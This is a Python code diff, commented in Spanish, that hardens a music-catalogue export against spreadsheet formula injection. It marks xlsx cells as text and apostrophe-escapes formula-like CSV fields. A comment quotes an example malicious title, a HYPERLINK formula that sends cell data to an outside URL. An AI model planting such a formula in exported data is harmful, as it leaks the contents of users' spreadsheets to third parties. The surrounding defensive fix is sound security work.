@@ -39,7 +39,7 @@ from openpyxl.utils import get_column_letter
 from .contratos import FORMATOS_LOSSLESS, Producto
 from .i18n import T
 from .texto import mmss as _mmss
-from .texto import nombre_seguro
+from .texto import nombre_seguro, parece_formula
 
 NAVY = "1F3864"
 GRIS = "F2F2F2"
@@ -94,12 +94,40 @@ def columnas():
     ]
 
 
+# ============================================================
+# Texto que viene de afuera, que no se ejecuta
+# ============================================================
+#
+# Los títulos, el artista y el sello los escribe quien subió el catálogo a
+# YouTube. openpyxl guarda como FÓRMULA cualquier texto que empiece con `=`, así
+# que un título `=HYPERLINK("https://…?x="&A2,"Ver")` llegaba vivo a la
+# planilla y se ejecutaba al abrirla. En el xlsx alcanza con marcar la celda
+# como texto: se ve igual y no se evalúa.
+#
+# En el CSV no hay tipos, y un programa de planillas evalúa lo que empieza con
+# `=`, `+`, `-` o `@`. Ahí sí hay que tocar el dato, con el apóstrofo que esos
+# programas entienden como «esto es texto». Pero sólo cuando parece una
+# fórmula (lleva un paréntesis, una barra o un signo de exclamación, que es lo
+# que necesita una llamada o un enlace DDE): hay discos que se llaman «+», «=»
+# o «-Intro-», y el nombre de un release no se altera por las dudas.
+
+
+def _texto_csv(v):
+    return "'" + v if parece_formula(v) else v
+
+
+def _celda(ws, fila, col, valor):
+    """Escribe una celda. Un texto nunca queda como fórmula."""
+    c = ws.cell(row=fila, column=col, value=valor)
+    if isinstance(valor, str) and c.data_type == "f":
+        c.data_type = "s"
+    return c
+
+
 def _encabezado(ws, titulo, subtitulo=""):
-    ws["A1"] = titulo
-    ws["A1"].font = Font(size=14, bold=True, color=NAVY)
+    _celda(ws, 1, 1, titulo).font = Font(size=14, bold=True, color=NAVY)
     if subtitulo:
-        ws["A2"] = subtitulo
-        ws["A2"].font = Font(size=9, color="666666")
+        _celda(ws, 2, 1, subtitulo).font = Font(size=9, color="666666")
     fila = 4
     for i, (nombre, ancho) in enumerate(columnas(), 1):
         c = ws.cell(row=fila, column=i, value=nombre)
@@ -131,7 +159,7 @@ def _filas_producto(ws, fila, p, con_archivo=True):
             t.get("url", ""),
         ]
         for i, v in enumerate(valores, 1):
-            c = ws.cell(row=fila, column=i, value=v)
+            c = _celda(ws, fila, i, v)
             c.alignment = Alignment(vertical="center")
             # Resaltamos en ámbar lo que NO es apto para entrega, para que no se
             # cuele un lossy en una entrega por distracción.
@@ -253,33 +281,37 @@ def hoja_ingesta_csv(productos, artista):
         # inventamos.
         p_line = f"{anio} {sello}".strip() if anio and p.get("label") else MARCA_COMPLETAR
         for t in p["tracks"]:
+            # Cada campo pasa por `_texto_csv`: ver la nota sobre las fórmulas.
             w.writerow(
                 [
-                    p.get("upc") or MARCA_COMPLETAR,
-                    p.get("title", ""),
-                    artista,
-                    p.get("kind", ""),
-                    p.get("release_date") or (f"{anio}-01-01" if anio else MARCA_COMPLETAR),
-                    sello,
-                    p_line,
-                    MARCA_COMPLETAR,  # C Line: no sale de YouTube
-                    MARCA_COMPLETAR,  # Genre
-                    MARCA_COMPLETAR,  # Language
-                    "Worldwide",
-                    t.get("tidal", {}).get("volume_number") if t.get("tidal") else 1,
-                    t.get("track_number") or "",
-                    t.get("isrc") or MARCA_COMPLETAR,
-                    t.get("track", ""),
-                    artista,
-                    _mmss(t.get("duration_s")),
-                    MARCA_COMPLETAR,  # Explicit
-                    MARCA_COMPLETAR,  # Composer
-                    MARCA_COMPLETAR,  # Publisher
-                    MARCA_COMPLETAR,  # Lyrics Language
-                    os.path.basename(t["audio_path"]) if t.get("audio_path") else "",
-                    "portada.jpg" if p.get("cover_bytes") else "",
-                    _fuente_corta(t),
-                    t.get("url", ""),
+                    _texto_csv(v)
+                    for v in [
+                        p.get("upc") or MARCA_COMPLETAR,
+                        p.get("title", ""),
+                        artista,
+                        p.get("kind", ""),
+                        p.get("release_date") or (f"{anio}-01-01" if anio else MARCA_COMPLETAR),
+                        sello,
+                        p_line,
+                        MARCA_COMPLETAR,  # C Line: no sale de YouTube
+                        MARCA_COMPLETAR,  # Genre
+                        MARCA_COMPLETAR,  # Language
+                        "Worldwide",
+                        t.get("tidal", {}).get("volume_number") if t.get("tidal") else 1,
+                        t.get("track_number") or "",
+                        t.get("isrc") or MARCA_COMPLETAR,
+                        t.get("track", ""),
+                        artista,
+                        _mmss(t.get("duration_s")),
+                        MARCA_COMPLETAR,  # Explicit
+                        MARCA_COMPLETAR,  # Composer
+                        MARCA_COMPLETAR,  # Publisher
+                        MARCA_COMPLETAR,  # Lyrics Language
+                        os.path.basename(t["audio_path"]) if t.get("audio_path") else "",
+                        "portada.jpg" if p.get("cover_bytes") else "",
+                        _fuente_corta(t),
+                        t.get("url", ""),
+                    ]
                 ]
             )
     return buf.getvalue()
